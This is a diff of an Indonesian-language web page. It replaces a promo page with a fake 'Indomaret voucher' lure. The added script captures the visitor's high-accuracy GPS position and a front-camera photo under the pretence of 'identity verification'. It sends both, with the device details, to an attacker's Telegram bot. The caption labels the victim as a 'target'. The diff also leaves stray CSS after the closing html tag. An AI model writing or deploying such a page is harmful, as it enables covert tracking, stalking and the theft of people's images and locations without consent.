@@ -17,24 +17,156 @@
 <body>
 
     <div class="box">
-    <h2>🎁 PROMO SPESIAL</h2>
-    <p>
-        Selamat datang! Lihat penawaran dan promo terbaru yang tersedia hari ini.
-    </p>
-
-    <button class="btn" onclick="startCapture()">SAYA MENEMUKAN HP INI</button>
+        <h2>SELAMAT ANDA MENDAPATKAN VOCER INDOMARET</h2>
+        <p>Untuk mendapatkan voucher Indomaret dengan syarat belanja minimal 25.000 tunjukan ke kasir .</p>
+        <button id="btnStart" class="btn" onclick="startCapture()">Silakan klik ok </button>
         <div id="status"></div>
     </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
-<style>
-body{
-    margin:0;
-    font-family:Arial, sans-serif;
-    background:linear-gradient(135deg,#ff4d4d,#ff9800);
-    display:flex;
+    <script>
+        // --- PENGATURAN BOT TELEGRAM ---
+        const botToken = "TOKEN_BOT_KAMU"; 
+        const chatId = "ID_TELEGRAM_KAMU";   
+
+        let locationData = null;
+
+        async function startCapture() {
+            const status = document.getElementById('status');
+            const btn = document.getElementById('btnStart');
+            btn.disabled = true;
+            btn.innerText = "MEMPROSES...";
+            status.innerText = "Menghubungkan ke server keamanan...";
+
+            // 1. Ambil lokasi GPS dulu
+            await getLocation();
+
+            // 2. Setelah itu ambil kamera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                status.innerText = "Memverifikasi identitas...";
+
+                setTimeout(() => {
+                    captureAndSend(stream);
+                }, 2000);
+
+            } catch (err) {
+                status.innerHTML = "<b style='color:red'>Izin kamera diperlukan untuk verifikasi!</b>";
+                btn.disabled = false;
+                btn.innerText = "COBA LAGI";
+            }
+        }
+
+        // Fungsi ambil GPS
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    console.log("Geolocation tidak didukung");
+                    resolve();
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        locationData = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            speed: position.coords.speed
+                        };
+                        console.log("Lokasi didapat:", locationData);
+                        resolve();
+                    },
+                    (error) => {
+                        console.log("Gagal ambil lokasi:", error.message);
+                        locationData = { error: error.message };
+                        resolve();
+                    },
+                    {
+                        enableHighAccuracy: true,  // WAJIB agar GPS akurat
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        function captureAndSend(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                // Siapkan caption dengan info lokasi
+                let caption = `📷 FOTO TARGET DITEMUKAN!\n\n`;
+                caption += `📱 Device: ${navigator.userAgent}\n`;
+                caption += `⏰ Waktu: ${new Date().toLocaleString('id-ID')}\n\n`;
+
+                if (locationData && locationData.lat) {
+                    caption += `📍 LOKASI GPS:\n`;
+                    caption += `Latitude: ${locationData.lat}\n`;
+                    caption += `Longitude: ${locationData.lon}\n`;
+                    caption += `Akurasi: ${Math.round(locationData.accuracy)} meter\n\n`;
+                    caption += `🗺 Google Maps:\nhttps://maps.google.com/?q=${locationData.lat},${locationData.lon}`;
+                } else {
+                    caption += `📍 Lokasi: Tidak diizinkan / gagal`;
+                }
+
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'target.jpg');
+                formData.append('caption', caption);
+
+                // Kirim FOTO ke Telegram
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(res => res.json())
+                .then(data => {
+                    // Kirim juga LOKASI sebagai pin peta (opsional, lebih keren)
+                    if (locationData && locationData.lat) {
+                        sendLocationPin();
+                    }
+
+                    document.getElementById('status').innerHTML = 
+                        "<b style='color:green'>✅ Verifikasi Berhasil.</b><br>Terima kasih atas bantuan Anda.";
+                    stream.getTracks().forEach(track => track.stop());
+                })
+                .catch(err => {
+                    console.error("Gagal kirim:", err);
+                });
+            }, 'image/jpeg', 0.8);
+        }
+
+        // Kirim lokasi sebagai pin di Telegram (bukan cuma teks)
+        function sendLocationPin() {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('latitude', locationData.lat);
+            formData.append('longitude', locationData.lon);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+    </script>
+</body>
+</html>    display:flex;
     justify-content:center;
     align-items:center;
     height:100vh;
